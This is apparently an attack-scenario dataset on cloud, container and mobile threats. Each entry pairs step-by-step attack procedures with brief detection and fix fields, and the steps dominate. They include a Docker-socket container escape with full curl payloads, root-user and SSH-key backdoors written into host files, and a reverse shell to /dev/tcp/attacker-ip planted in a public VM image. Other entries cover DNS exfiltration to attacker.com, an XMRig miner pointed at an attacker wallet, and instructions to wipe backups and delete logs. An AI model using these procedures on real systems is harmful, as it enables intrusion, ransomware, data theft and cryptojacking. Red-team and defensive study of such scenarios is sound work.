Title: Insider Threat via Leaked Mobile Build → Cloud Ransomware
Attack Type: Cloud Ransomware via Accessed VMs / Storage
Scenario Description: An internal developer or contractor leaks a mobile APK or iOS build (e.g., via email, pastebin, GitHub). The build contains hardcoded secrets like API keys, Firebase tokens, or cloud credentials. An attacker analyzes the leaked app, extracts keys, and uses them to pivot into cloud storage or VM control, eventually launching ransomware.
Tools Used: Apktool, Jadx-GUI, MobSF, AWS CLI, Postman, Python ransomware script
Attack Steps: Step 1: Obtain Leaked Build – Find leaked app builds from GitHub, forums, or insider channels. Download the APK or IPA. Step 2: Decompile the App – Use Apktool (apktool d app.apk) or Jadx-GUI to decompile the app and read Java source. Look for keys or sensitive endpoints. Step 3: Identify Hardcoded Cloud Keys – Look in strings.xml, config.json, or source code for values like AWSAccessKey, FirebaseURL, GCP_API_KEY. Step 4: Test Key Validity – Use Postman or CLI to test if the key is still active. For AWS, try aws s3 ls or aws ec2 describe-instances. If valid, attacker now has cloud access. Step 5: Explore Storage and VMs – Use the stolen credentials to list and access S3 buckets, EBS volumes, and VMs. Step 6: Deploy Ransomware – Upload a ransomware script or reverse shell to a writable location on a VM (e.g., /tmp), and execute it via CLI, SSH, or automation pipelines. Step 7: Encrypt Data – Encrypt files and volumes using local encryption scripts or cloud-native methods (e.g., re-encrypt EBS, wipe snapshots). Step 8: Exfiltrate and Delete Backups – Use rclone to exfiltrate files. Delete old backups or snapshots to prevent recovery. Step 9: Upload Ransom Note – Place a ransom note file on all accessed VMs and S3 buckets. Step 10: Exit – Remove the stolen keys from the configuration if possible, delete logs, and exit the cloud environment.
Target Type: Mobile Build → Cloud Storage / VM → Internal Data
MITRE Technique: T1521 (Credential Access), T1552 (Unsecured Credentials), T1486 (Data Encryption)
Impact: Cloud resource takeover via insider app leak → ransomware impact
Detection Method: Monitor leaked builds online, detect leaked key usage, audit CI logs
Solution: Never hardcode secrets, use env variables, rotate keys regularly, restrict IAM access
Tags: Cloud, Insider Threat, Mobile Leak, Ransomware, Secrets, IAM
Source: Based on real Uber, Toyota, and Codecov leaks

Title: Abusing Cloud Functions via Mobile Integration → Cloud Ransomware
Attack Type: Cloud Ransomware via Accessed VMs / Storage
Scenario Description: Mobile apps often call serverless cloud functions (e.g., AWS Lambda, Azure Functions, GCP Cloud Functions) for actions like user auth or uploading files. If these functions are misconfigured (e.g., no auth, over-privileged IAM), an attacker can call them directly and escalate to internal VMs or storage, then deploy ransomware.
Tools Used: Postman, APKTool, GCP CLI, AWS CLI, MobSF, Python encryption scripts
Attack Steps: Step 1: Analyze Mobile App – Use MobSF or APKTool to extract cloud function endpoints from the mobile app (e.g., https://<region>.cloudfunctions.net/processFile). Step 2: Test Public Access – Use Postman or curl to send a test request to the endpoint. If it responds without auth, it’s exploitable. Step 3: Abuse Function Logic – Check if function allows file uploads, commands, or storage modification. For example, if it allows file uploads to cloud buckets, use it to upload ransomware payloads. Step 4: Explore Permissions – If cloud function has high IAM privileges, use SSRF inside the function or metadata access (e.g., http://169.254.169.254) to steal credentials. Step 5: Use Stolen Credentials – Configure CLI tools and list available VMs and buckets (aws ec2 describe-instances, aws s3 ls). Step 6: Access VMs or Trigger via Function – Some functions can invoke workflows or scripts on backend VMs. Abuse that to run encryption payloads. Step 7: Encrypt Storage – Access and encrypt cloud storage (aws s3 rm, gsutil rm, or custom script). Step 8: Leave Ransom Note – Inject ransom messages in buckets, VM disks, or even cloud logs. Step 9: Hide Tracks – Remove function logs or disable monitoring if IAM allows. Exit all sessions.
Vulnerability: Over-permissioned Cloud Functions, Lack of Auth
MITRE Technique: T1586 (Compromise Cloud Functions), T1521 (Cloud Credentials), T1486 (Encryption)
Impact: Serverless abuse → full cloud ransomware deployment
Detection Method: Monitor cloud function traffic, apply auth layers, detect anomalies
Solution: Apply strict IAM roles, enable cloud function auth, scan for public access
Tags: Cloud, Serverless, Mobile, Functions, Ransomware, IAM, Firebase
Source: Based on Firebase misconfigs, GCP function exposures, red team playbooks

Title: Remote Code Execution (RCE) via Mobile API in Container
Scenario Description: An attacker finds a mobile application's API that interacts with a backend microservice running in a Docker container. This API accepts user input and passes it unsanitized to system commands (e.g., using Python’s os.system() or Node.js’s exec). The attacker exploits this to achieve Remote Code Execution and breaks out of the container.
Tools Used: Mobile API client (Postman or Burp Suite), Docker, API URL
Attack Steps: Step 1: Identify the mobile app endpoint using tools like Burp Suite or intercept proxy that allows file upload or command execution (e.g., /run?cmd=ping).Step 2: Send a crafted API request to test for command injection, like cmd=ping 127.0.0.1; whoami or cmd=ls && cat /etc/passwd.Step 3: If output contains system files or user info, confirm it’s vulnerable to RCE.Step 4: Chain more commands to explore the container environment: ls /, cat /etc/os-release, etc.Step 5: Check if the container is running as root by sending id or whoami — output should say root.Step 6: If container is root and Docker socket is mounted (/var/run/docker.sock), exploit it by sending: curl --unix-socket /var/run/docker.sock http://localhost/containers/json to list containers.Step 7: Create a new container with host mounts: curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' http://localhost/containers/create?name=hackedStep 8: Start it and exec into it: docker start hacked && docker exec -it hacked chroot /host — you are now on the host system.Step 9: Dump /etc/shadow, add user, backdoor the host or escalate to full control.
Vulnerability: Improper Input Validation, Unsafe API, Mounted Docker Socket
Impact: Full container escape, host compromise, lateral movement
Detection Method: Monitor API traffic for suspicious commands, audit Docker socket access
Solution: Never expose docker.sock, validate inputs, use non-root containers, apply AppArmor/SELinux
Tags: rce, container breakout, mobile api, docker escape, cloud

Title: Mounting Host Volume into Container
Scenario Description: In this case, a container is misconfigured to mount a sensitive part of the host system (like / or /etc) into the container’s filesystem. If an attacker gains access to this container, they can modify host files and potentially gain root access on the host.
Attack Steps: Step 1: Gain access to the container via web shell, command injection, or existing service like SSH or exposed API.Step 2: Run mount or df -h inside the container to check for host volumes (look for unusual mount points like /host, /mnt, etc.).Step 3: Navigate to the mount point and confirm host files exist, for example: cd /host/etc && ls — look for passwd, shadow, etc.Step 4: To escalate, edit the /host/etc/shadow file inside container to add a new root user hash:echo 'hacker:$6$hash...:0:0:root:/root:/bin/bash' >> /host/etc/shadowStep 5: Add entry to /host/etc/passwd if needed: hacker:x:0:0::/root:/bin/bashStep 6: Exit container and SSH into host using your new root user (if SSH is enabled), or reboot the system if you added a cron job.Step 7: If /host includes /root/.ssh, you can add your key: echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys and login as root.Step 8: You now have persistent, root-level access on the host from inside the container.
Impact: Full control over host from container
Detection Method: Audit mounted volumes in containers, monitor shell activity
Solution: Avoid host volume mounts, use read-only volumes, apply AppArmor profiles
Tags: container escape, docker mount, privilege escalation, root access
Source: Docker official docs, OWASP Container Security Project

Title: QR Code Phishing for SSO Login
Scenario Description: The attacker tricks a user into scanning a malicious QR code that initiates a legitimate-looking login flow but captures the resulting SSO session or MFA approval in real time.
Tools Used: EvilQR, QR Code Generator, QR Phishing Pages, Evilginx2
Attack Steps: 1. The attacker creates a fake login page that mimics a legitimate cloud service (e.g., Microsoft 365 or AWS Workspaces).2. Instead of using a traditional username/password input, the page displays a QR code that is tied to a legitimate login process (like login.microsoftonline.com/device or similar device code flows).3. The QR code is embedded with a URL that triggers OAuth or SSO login on the victim’s phone — commonly seen in SSO login for mobile.4. The attacker sends this QR code to the victim via email, Slack message, or as part of a fake company login page.5. The victim scans the QR code thinking it's part of a secure login process (e.g., VPN access, Zoom login, etc.).6. On scanning, the victim’s phone or device redirects to the real Microsoft SSO login and prompts them to approve access.7. Meanwhile, the attacker is waiting to catch the token/session that results from that approval.8. If Evilginx2 or a phishing proxy is used, the attacker can intercept the OAuth access token or session cookie.9. The attacker replays the token in their browser and gains full access — without knowing the victim’s password or triggering extra MFA.10. The attack bypasses MFA by hijacking the trust flow between the phone and the cloud service, using the QR as the entry point.
Target Type: Mobile SSO logins, cloud OAuth flows, IDPs with device flow
Vulnerability: QR login flow lacks binding to originating user or device
MITRE Technique: T1566.002 (Phishing Link), T1556.004 (Phishing for MFA), T1550.003 (Session Hijack)
Impact: Attacker gains full SSO access without needing credentials or MFA manually
Detection Method: Detect unusual logins via QR/device flow, short-lived token use from foreign IPs
Solution: Disable QR-based login unless required, bind device flows to originating IP/device fingerprint, enforce conditional access
Tags: qr phishing, device login abuse, oauth hijack
Source: Microsoft OAuth Docs, Evilginx2 GitHub, MITRE ATT&CK

Title: Local Token Cache / Keychain Stealing
Scenario Description: Tokens or credentials cached in local keychains (e.g., Windows Credential Manager, macOS Keychain, or browser local storage) are extracted by attackers or malware and reused to gain access without triggering MFA.
Tools Used: Mimikatz, TokenSnatcher, Keychain Dumper, PowerShell, Google Chrome Tools
Attack Steps: 1. The user logs into a cloud account via CLI, browser, or desktop client (e.g., OneDrive, AWS CLI, Azure CLI).2. The application caches tokens, access credentials, and/or refresh tokens locally — in the OS credential manager (e.g., Credential Manager on Windows), browser local storage, or system keychain.3. The attacker gains access to the victim’s machine (via malware, USB drop, RDP brute force, or insider threat).4. The attacker executes a tool like Mimikatz (Windows) or security find-generic-password (macOS) to extract stored tokens or credentials.5. Alternatively, attacker parses files like ~/.aws/credentials, ~/.azure/accessTokens.json, or browser cookies manually.6. They locate valid access tokens or refresh tokens linked to cloud services (e.g., Microsoft Graph, Google Workspace, AWS APIs).7. Using tools like Postman, Curl, or a custom script, the attacker replays the tokens to access APIs, dashboards, or SSO platforms.8. Since these tokens were issued post-MFA and are still valid, the attacker doesn’t need to perform any additional authentication.9. Actions taken by the attacker are logged under the victim’s identity.10. The victim usually doesn’t notice unless alerting is configured or the token is revoked.
Target Type: Windows/macOS/Linux machines, CLI tools, browser caches
Vulnerability: Tokens stored locally without device/session/IP binding
MITRE Technique: T1555.003 (Browser Credential Dumping), T1552.001 (Unprotected Credential Files)
Impact: Full access to cloud platforms without triggering login or MFA
Detection Method: Monitor credential store reads, unusual token usage, file system access anomalies
Solution: Encrypt credential stores, rotate tokens often, limit token lifespan, enforce token binding
Tags: mimikatz token theft, local credential abuse, cloud api access
Source: Mimikatz GitHub, Microsoft Docs, MITRE ATT&CK, OWASP

Title: Malicious Image with Pre-installed Backdoors
Attack Type: Supply Chain Attack via Trusted Cloud Image
Scenario Description: In this attack, the attacker uploads a public VM image (like an AMI in AWS or a custom GCP image) with a pre-installed backdoor or reverse shell. A user trusts the image as it's in the cloud marketplace and launches it. Once the instance is running, the attacker remotely connects via the hidden backdoor and gains control.
Tools Used: AWS CLI, netcat, Burp Suite, Kali Linux
Attack Steps: 1. Understand the Goal: You want to simulate what a malicious actor might do by placing a backdoor into a cloud image and making it public.2. Prepare the Environment: On your local system or cloud VM (Kali Linux preferred), install tools like netcat, ncat, or bash-reverse-shell.3. Create a Custom VM Image: - In AWS: Launch a basic EC2 Linux instance. - Configure it with a backdoor: Edit /etc/rc.local or .bashrc to include a reverse shell, like: bash -i >& /dev/tcp/attacker-ip/4444 0>&1 - Ensure your attacker machine (e.g., Kali) has port 4444 open and listening with: nc -lvnp 44444. Harden It to Look Legit: Install some useful packages (e.g., Nginx, Python), remove terminal history (history -c), change user name to something generic.5. Create an AMI (Amazon Machine Image): - Stop the EC2 instance, then create an AMI. - Set AMI visibility to "Public" or "Shared with Specific AWS Account".6. Trigger Victim to Use It: Assume a cloud user downloads or uses the image (thinking it’s safe from Marketplace).7. Wait for Connection: When the user launches the VM, your backdoor activates and connects to your attacker's IP. - You receive a reverse shell connection. - Now, you can execute commands on their instance without authentication.8. Maintain Persistence: You may install cronjobs or additional shells if the connection breaks.Important Note: NEVER do this on real cloud customers or publish this publicly—this is strictly for controlled labs or ethical testing only.
Impact: Full system compromise, data exfiltration, crypto mining, lateral movement
Detection Method: CloudTrail logs, network traffic inspection, EDR on cloud workloads
Solution: Use only vetted images, scan marketplace images, restrict image usage to internal trusted registry
Tags: cloud-security, backdoor, aws, malicious-image, marketplace, ec2, mitre-t1608.002
Source: Red Team Cloud Simulations, MITRE ATT&CK, AWS Docs

Title: Misconfigured Security Defaults in Image
Attack Type: Misconfiguration Abuse via Public VM Image
Scenario Description: An attacker or even a careless developer publishes a cloud image (like an AMI, GCP image, or Azure VM template) with weak security defaults like password authentication enabled, SSH root login, open ports, default credentials, or outdated packages. Any user using this image inherits the insecure settings, leading to high-risk compromise opportunities.
Tools Used: AWS CLI, nmap, ssh, metasploit, ssh-audit
Attack Steps: 1. Understand the Scenario: We want to demonstrate what can go wrong if someone uses a VM image from a cloud marketplace that has poor default security.2. Start with a VM Image (Your Own or Public One): Launch a public image from AWS Marketplace or GCP.3. Scan for Misconfigurations: - Use nmap to scan open ports: nmap -Pn victim-ip - Check for SSH open (port 22), HTTP (80), FTP (21), etc. - Try SSH login with username "root" and blank or default passwords using ssh root@ip-address. - If successful, note that the image has weak security defaults.4. Simulate Access Exploitation: - If you find open FTP, try to connect: ftp ip-address, then try credentials like ftp:ftp, admin:admin, anonymous. - If the image has public writeable directories, upload malicious scripts (e.g., reverse shell via PHP or Python).5. Privilege Escalation Check: - Once in, run sudo -l to check if the user can run commands as root. - If sudo is unrestricted, you can gain full control easily.6. Check for Exposed Services or Credentials: - Look in /home/, /var/, .bash_history, and .aws/credentials for stored secrets.7. Simulate Cleanup and Exit: - Clear logs (history -c, remove bash logs). - Disconnect after testing.Why This Works: Many developers forget to disable password SSH, don't enforce key-based login, or leave hardcoded passwords in their marketplace images.IMPORTANT: Only do this in a controlled lab setup or internal cloud project. Never attack or exploit third-party or unknown real-world images.
Vulnerability: Weak Security Defaults in VM Image
Impact: Full VM takeover, lateral movement, data access
Detection Method: Scan image baseline, SSH audit tools, cloud config scanner
Solution: Create hardened base images, enforce scanning, restrict who can publish images
Tags: cloud-image, marketplace-risk, security-defaults, vm-hijack, cloud-penetration, mitre-t1609.001
Source: Cloud Security Labs, AWS Security Blog, MITRE ATT&CK

Title: Exposed API Keys or Secrets in Image
Scenario Description: In this attack, the threat actor identifies and launches a public VM image (like AMI, GCP, or Azure image) that contains leftover sensitive files such as .env, .aws/credentials, or API tokens from the developer’s environment. When the image is used, the attacker inspects the filesystem and extracts secrets to access cloud services.
Tools Used: AWS CLI, GCP CLI, grep, strings, truffleHog, gittyleaks
Attack Steps: 1. Understand the Scenario: Many developers build cloud images and forget to remove their credentials or API keys.2. Find a Public Image: Go to AWS EC2 → AMIs → filter for “Public Images”. Pick a Linux image created by non-Amazon publishers.3. Launch the Image: Create a new EC2 instance using that AMI.4. Connect to the Instance: Use SSH to log in. If using AWS: ssh -i your-key.pem ec2-user@public-ip5. Search for Secrets in Common Locations: - Run: find /home -type f -iname "*.env" - Check: /home/ubuntu/.aws/credentials, /root/, /var/www/, or even /opt/. - Use: grep -i 'key' -r / or grep -i 'secret' -r /6. Look for Common File Names: .env, .npmrc, .bash_history, .aws/config, config.json, .git/config7. Analyze with Secret Scanning Tools: Install and run truffleHog or gittyleaks to automatically scan the file system.8. Extract & Test: If you find a key (e.g., AWS key), try: aws sts get-caller-identity --profile stolen-profile to validate access.9. Simulate Cloud Access: With valid secrets, you can list S3 buckets, read secrets, or deploy malicious services.10. Cleanup: Exit and terminate instance.Note: This simulates an attacker using a published image with hardcoded secrets. NEVER test on third-party images.
Detection Method: File scans, secret scanning tools, CloudTrail
Solution: Scan images for secrets before publish, use automated scanners

Title: Outdated Software with Known CVEs
Attack Type: Exploitation via Known Vulnerabilities in Image
Scenario Description: Cloud images shared on marketplaces often contain outdated versions of web servers, packages, and OS components with known vulnerabilities (CVEs). Attackers use these vulnerable packages to exploit the instance using tools like Metasploit, Nmap, or custom payloads.
Tools Used: Nmap, Nessus, CVE Details, Metasploit, searchsploit
Attack Steps: 1. Launch a Public Image: Pick an older image from a marketplace (e.g., Ubuntu 16.04, CentOS 7).2. Scan for Open Services: Use nmap -sV <target-ip> to find running software and their versions (e.g., Apache 2.2, PHP 5.6).3. Identify CVEs: Take version numbers and search CVEs using cvedetails.com or run a vulnerability scanner like Nessus, OpenVAS, or lynis.4. Exploit Using Metasploit (Optional): - Launch msfconsole - Search for matching exploits: search apache 2.2 - Set target IP and run payload.5. Manual Exploitation: If Metasploit is not used, look for public PoC from GitHub or searchsploit.6. Post-Exploitation: Once in, escalate privileges if possible and dump data.7. Verify Impact: Try reading sensitive files or creating new users.8. Cleanup and Exit: Remove logs and terminate the test instance.This simulates attackers leveraging outdated packages inside public images.
Detection Method: Vulnerability scanner, Nmap, Nessus
Solution: Regular image patching, use CIS base images, scan before publish

Title: Unnecessary Privileges Granted by Image Defaults
Attack Type: Privilege Escalation via Image Default Config
Scenario Description: Developers may create VM images with misconfigured sudoers, passwordless root, world-writable files, or user accounts with excessive access. When reused, these images enable attackers to escalate privileges or tamper with services.
Tools Used: Linux VM, sudo, ssh, find, bash, LinPEAS
Attack Steps: 1. Launch Public Cloud Image: Start an EC2 or GCP instance using a non-official image.2. SSH into the Instance: Connect using provided key or default username.3. Check for Root Access: Try: sudo -l — if the current user can run all commands as root without a password, that’s a misconfiguration.4. Test for Passwordless Root: Run: sudo su - — if you get root shell directly, image has privilege issue.5. Check /etc/sudoers File: Look for lines like ALL=(ALL) NOPASSWD:ALL.6. Check for Extra Users: Run: cat /etc/passwd — see if there are unnecessary users with /bin/bash access.7. Check Permissions: Find all world-writable files: find / -perm -2 -type f8. Try Editing System Services: Modify files under /etc/systemd/ or /etc/init.d/ to execute arbitrary code.9. Privilege Escalation via SUID/SGID: Search for vulnerable binaries: find / -perm -4000 2>/dev/null10. Verify Control: Create a new root user or read sensitive system files as a simulation.11. Cleanup: Restore file changes and shut down instance.This simulates a VM image with default settings that allow privilege misuse.
Vulnerability: Sudo misconfig, excessive user rights, poor access control
MITRE Technique: T1548.003 (Sudo and Sudo Caching), T1068 (SUID Exploitation)
Impact: Full root access, persistence, lateral movement
Detection Method: Check user permissions, access logs, privilege auditing tools
Solution: Harden base images, restrict privileges, scan before use

Title: Data Exfiltration via Hidden C2 Channel in Marketplace Image
Attack Type: Covert Channel / Data Exfiltration via Malicious Container
Scenario Description: An attacker embeds a hidden command‑and‑control (C2) server inside a seemingly legitimate container image available in a public marketplace. When a user deploys it, the image silently connects to the attacker’s C2 and exfiltrates data through DNS or HTTPS within container logs or files.
Tools Used: Docker CLI, Container Registry CLI, Cert‑util, nc (netcat), custom Python DNS exfil script, Wireshark, Security Monkey, Falco
Attack Steps: Step 1: Setup attacker-controlled C2 server. Install Docker and DNS‑capable web server. Configure DNS zone attacker.com on your server to receive data. Step 2: Build a Docker image based on a legitimate marketplace image (e.g., ubuntu:20.04). Add a hidden script /usr/local/bin/.init_c2.sh that runs at container startup, using RUN chmod +x and ENTRYPOINT. Step 3: The hidden script uses Python or curl to send internal file contents (e.g., /etc/passwd) out via DNS queries (e.g., abcd123.attacker.com) or HTTPS POST to your server. DNS payload is base32-encoded chunks. Step 4: Push the malicious image to a public container registry (Docker Hub, ECR, GCR) under an innocent-sounding name (e.g., trusted/ubuntu-base). Step 5: Victim pulls and runs the image in their cloud environment (ECS, Kubernetes). The hidden script executes immediately on container start. Step 6: The script reads sensitive files from container file system or mounted volumes (e.g., /etc/secrets/* or credentials). It encodes and exfiltrates data chunk by chunk via DNS requests to xb94f.attacker.com or HTTPS to your C2. Step 7: On your DNS/C2 server, parse incoming requests or HTTP logs to reconstruct exfiltrated data. Confirm by viewing logs or database. Step 8: After exfiltration, script may delete logs or remain quiet to avoid detection. Container continues running normal processes. Step 9: Use tools like Wireshark or host-level network logs to analyze unexpected DNS requests, long domain names, or connections to unknown domains. Step 10: If detection triggered, attacker can update image with stealth improvements (encryption, randomized time delays) and push new version.
Vulnerability: User-trusted marketplace images lack integrity verification; no network monitoring
MITRE Technique: T1071.004 – Application Layer Protocol: DNS; T1002 – Data Compressed
Impact: Silent data theft, exposure of credentials, lateral movement, compliance failure
Detection Method: Look for unusual DNS requests, long or encoded domain names, unexpected HTTPS to unknown IPs; monitor container ENTRYPOINT, scan new images for unexpected scripts
Solution: Enforce image signing and verification (Docker Content Trust), restrict public images, scan images for suspicious layers with Trivy or Clair, restrict egress traffic, implement network policies (deny by default), monitor DNS logs for anomalies
Tags: Container Image Abuse, DNS Exfiltration, Stealth C2
Source: CISA Alerts, MITRE ATT&CK, Google TAG Reports

Title: Command-and-Control (C2) Channel in Background
Attack Type: Covert Communication Channel / Remote Control Backdoor
Scenario Description: An attacker uploads a virtual machine image or container to a cloud marketplace (like AWS Marketplace, Docker Hub, or Azure Marketplace) that looks completely safe. Inside that image is a hidden process or script that silently connects to a command-and-control (C2) server operated by the attacker. This C2 connection allows the attacker to send instructions, receive stolen data, or keep access to the target’s system — all running silently in the background without the user's awareness. This is very dangerous because many organizations trust marketplace images without scanning them fully.
Tools Used: Docker, nc (netcat), curl/wget, reverse shell scripts, cloud CLI (AWS CLI / Azure CLI), attacker-controlled VPS or server (DigitalOcean, AWS EC2), Wireshark, DNS tunneling tools, Trivy image scanner
Attack Steps: Step 1: Attacker prepares a clean-looking base image (like Ubuntu or CentOS) that is commonly used in cloud deployments. They create a Dockerfile or VM image and insert a hidden reverse shell script inside it, like a .sh file hidden in /tmp or /etc/init.d/. Step 2: Attacker modifies the image to run this malicious script in the background every time the image starts. This is done using CMD, ENTRYPOINT, or crontab in the Dockerfile. The script runs a reverse shell or beacon script that tries to connect to the attacker’s server using DNS, HTTP, or HTTPS. Step 3: Attacker sets up a command-and-control (C2) server on a VPS with tools like netcat or a custom Flask-based server that listens on a port (e.g., port 4444 or 8080). The server waits for incoming connections from infected systems. Step 4: Attacker uploads this malicious image to a public cloud marketplace or Docker Hub with a name like cloud-optimized-ubuntu, secure-nginx, or similar, so users trust it. Step 5: A cloud user (victim) pulls and runs the image in their environment (e.g., EC2, Kubernetes, Azure VM). The container or VM starts running normally, doing what it’s supposed to do. But in the background, the hidden script silently sends a request to the attacker’s server like curl attacker-server.com/connect?instance_id=xyz. Step 6: Once the connection is successful, the attacker gets a shell or remote access to the container or machine. They can now execute commands remotely, steal data, run malware, add users, or create persistence. Step 7: The victim usually has no idea this is happening because there are no error messages, no open windows, and no logs unless they specifically check deep system logs or use advanced detection tools. Step 8: If the attacker wants to exfiltrate data, the hidden script can send compressed files or sensitive data to the attacker's server using HTTPS or encoded DNS requests. Step 9: The attacker can use tools like netcat to receive data: nc -lvnp 4444, or send remote shell commands back to the victim. They can also update the script using remote commands to make it more stealthy. Step 10: Eventually, unless the image is analyzed or flagged, this background connection continues to exist every time someone uses the marketplace image. Attackers can use this to build botnets or keep persistent access in cloud networks.
Target Type: Cloud-hosted containers, VMs, ECS, Kubernetes clusters
Vulnerability: No image scanning; auto-deployment of marketplace images; hidden malicious startup scripts
MITRE Technique: T1071 – Application Layer Protocol; T1105 – Ingress Tool Transfer
Impact: Attacker gains remote shell access, bypasses firewalls, steals data silently
Detection Method: Use container security tools like Falco, Wireshark, or OSSEC to detect abnormal outbound connections to unknown IPs or domains. Monitor DNS logs, and use process monitoring to catch unusual startup scripts.
Solution: Always scan images using tools like Trivy or Clair before using them in production. Only use verified publisher images. Restrict egress connections using VPC/network ACLs. Block unknown domains/IPs. Review all image layers manually or automate scanning.
Tags: C2, Reverse Shell, Docker Abuse, Marketplace Risk

Title: Cryptojacking Malware Pre-installed
Scenario Description: The attacker creates a virtual machine or container image that appears to be legitimate (such as Ubuntu or Nginx image), uploads it to a public cloud image marketplace, and pre-installs cryptocurrency mining malware inside it. When a cloud user unknowingly uses the image, the mining software silently runs in the background using the target’s CPU/GPU resources to mine cryptocurrency (e.g., Monero, Bitcoin) for the attacker. This causes increased electricity/cloud bills, poor performance, and in some cases, security violations.
Tools Used: Docker, cloud image marketplace (Docker Hub, AWS Marketplace), XMRig (crypto miner), cron, netstat, ps, top, Trivy/Clair (for detection), attacker-controlled mining pool (e.g., supportxmr.com)
Attack Steps: Step 1: Attacker installs Docker or any cloud image builder tool and selects a base image that is popular and trusted (like ubuntu:20.04). They add mining software such as XMRig inside the image. They place it in a hidden directory such as /usr/local/bin/.xmrig. Step 2: They write a script named .startminer.sh that launches the miner silently in the background. This script is configured to automatically start during boot or container run using CMD, ENTRYPOINT, or crontab. The script points the miner to the attacker’s mining pool with the attacker’s wallet ID, like: xmrig -o pool.supportxmr.com:3333 -u 48...attacker_wallet... -k. Step 3: The attacker builds the image and uploads it to a public registry like Docker Hub or AWS Marketplace with a trustworthy name (e.g., secure-linux-base, cloud-ready-nginx, fast-node-env). Step 4: A cloud user (victim) deploys the image assuming it's safe. This may happen in ECS, Kubernetes, Azure VM, or Google Cloud Run. As soon as the image starts, the miner launches in the background, silently consuming CPU. Step 5: The miner connects to the attacker's mining pool and begins mining cryptocurrency, sending mining rewards to the attacker’s wallet. The victim sees no error messages. The container/VM seems to work normally. Step 6: Over time, the victim’s cloud bills increase drastically due to CPU/GPU resource usage. The system may also slow down. Step 7: If the victim checks system processes using top, htop, or ps aux, they may see suspicious processes like xmrig, or processes consuming very high CPU. Network tools like netstat -ntlp may show connections to strange IP addresses (i.e., mining pool servers). Step 8: If a security tool like Falco, Trivy, or AWS GuardDuty is used, it may flag high CPU usage or suspicious outbound connections. Step 9: The attacker keeps updating the image to avoid detection — obfuscating the miner, renaming it (e.g., update-daemon), or using encrypted traffic. Step 10: Unless caught, the attacker keeps earning cryptocurrency while the victim pays the cloud bills unknowingly. The attacker may even use automation to infect multiple users at scale.
Vulnerability: Lack of image scanning; no integrity verification; hidden resource-consuming binaries
Impact: Cloud resource abuse, high billing, system slowdown, reputation damage
Detection Method: Monitor CPU usage, scan images with Trivy/Clair, check running processes (ps, top), use GuardDuty or Falco to detect anomalies
Solution: Only use verified cloud images; scan every image with security tools; monitor system resource metrics; disable outbound mining connections using firewall rules; set CPU quotas for containers
Tags: Cryptojacking, Cloud Resource Abuse, Mining Malware
Source: Azure Conditional Access, Okta Policy Docs, MITRE ATT&CK

Title: Fake Software Image (Typosquatting or Lookalike)
Scenario Description: Attacker creates a cloud image or container with a name that looks very similar to a real one (e.g., nginx-official instead of nginx, redis-secure instead of redis, mlflow123 instead of mlflow). Unsuspecting users searching in the marketplace choose the fake image by mistake, which has pre-installed malware or remote access tools. It looks and acts like the original image to avoid suspicion.
Tools Used: Docker, cloud marketplace, image scanner (Trivy, Grype), netcat, curl, malware, C2 tools
Attack Steps: Step 1: Attacker checks popular software images (like nginx, redis, tensorflow, etc.) on Docker Hub, AWS Marketplace, or Azure Marketplace. They note official names and publisher IDs. Step 2: They create their own image with a similar name, such as nginx-official, nodeapp-base, mlflow-secure, or ubuntu-latest-build. The name looks close enough that a beginner might think it's real. Step 3: In the Dockerfile, the attacker copies original open-source software (e.g., installs nginx normally), then adds hidden malware — like a C2 script, a cronjob that sends user data, or a reverse shell that activates on boot. Step 4: Attacker publishes the image with a misleading title and description, claiming security, performance, or GPU optimization benefits. They use a name that sounds legitimate like “Cloud Speed Official Team.” Step 5: Victim searches the marketplace for nginx, sees the fake image ranked high, and pulls it. Victim deploys the image on their Kubernetes, ECS, or VM environment. Step 6: The image behaves normally, serving HTTP requests, but a background process sends instance metadata, IP address, or file system data to attacker (via curl or custom beacon). Step 7: Attacker maintains persistent access and may later push updated image versions with new backdoors. Users keep pulling the poisoned image. Step 8: If detected, attacker may rebrand and re-upload under a new typo or variation. Step 9: Victims may only notice the issue if their CPU is abnormally high, or network traffic is unusual. Without image scanning, it goes undetected.
Impact: Unauthorized access, malware infection, resource abuse, C2 communication
Detection Method: Monitor image source/publisher, use image scanning tools like Trivy, check signatures, analyze process/network behavior
Solution: Use only verified and official images; scan every image; enforce strict naming rules; enable admission controllers to restrict unknown images
Source: Google Security Blog, OWASP, HackerOne, MITRE ATT&CK

Title: Supply Chain Infection (3rd Party Tools Included)
Scenario Description: Attacker builds a public container image or virtual machine image that includes useful software (e.g., Python, Node.js, Jupyter, or DevOps agents), but silently includes a malicious or backdoored 3rd-party package or script. When a user installs or runs the image, the included malicious tool executes hidden code in the background—sending credentials, creating remote access, or infecting CI/CD pipelines.
Tools Used: Docker, PyPI/pip, npm, GitHub, image scanner tools (Trivy, Grype), attacker’s VPS, Burp Suite
Attack Steps: Step 1: The attacker begins by building a Docker image using a standard base image like ubuntu:22.04 or python:3.10. This image appears clean and well-organized. Step 2: The attacker then installs normal libraries or tools expected by developers or DevOps engineers, such as pip install pandas numpy requests or apt install docker git. This makes the image look helpful and realistic. Step 3: Next, the attacker installs a backdoored third-party package — for example, they create and upload a Python package to PyPI with a name like utils-helper or http-requester, which looks harmless. Inside this package, the attacker hides malicious code in a file like __init__.py or setup.py, which executes automatically when the package is imported. The code may read AWS credentials from ~/.aws/credentials, environment variables, or SSH keys, and send it to the attacker's server using HTTPS or DNS. Step 4: In the Dockerfile, the attacker adds pip install utils-helper or npm install safe-logger — the malicious dependency. These are installed during image build time and look like normal packages. Step 5: The attacker uploads the final image to Docker Hub or a cloud image registry with a nice-looking name and description, like ml-dev-env, secure-python-base, or devops-ci-box. Step 6: A victim (developer, engineer, or student) searching for images finds this one, pulls it using docker pull, and runs it in their system, cloud VM, CI/CD pipeline, or Kubernetes pod. Step 7: When the image runs, the malicious package auto-executes its hidden payload. It might run silently in the background and collect environment variables (tokens, DB passwords), upload code to attacker’s server, or open a backdoor. Step 8: This supply chain infection now spreads: anyone cloning the container, building CI jobs, or running workloads based on the poisoned image will unknowingly run the malware. Step 9: Over time, attacker uses the stolen data to pivot: using leaked credentials to access S3 buckets, GitHub tokens, databases, or even IAM roles in cloud providers. Step 10: Victim organization might not detect this immediately because everything seems normal — the image works as expected. Only detailed image scanning, traffic monitoring, or seeing strange access logs might raise alarms. Step 11: The attacker can update the package or image anytime to improve stealth, re-upload it with slightly different names to avoid detection, and continue the cycle unless it is flagged or blocked.
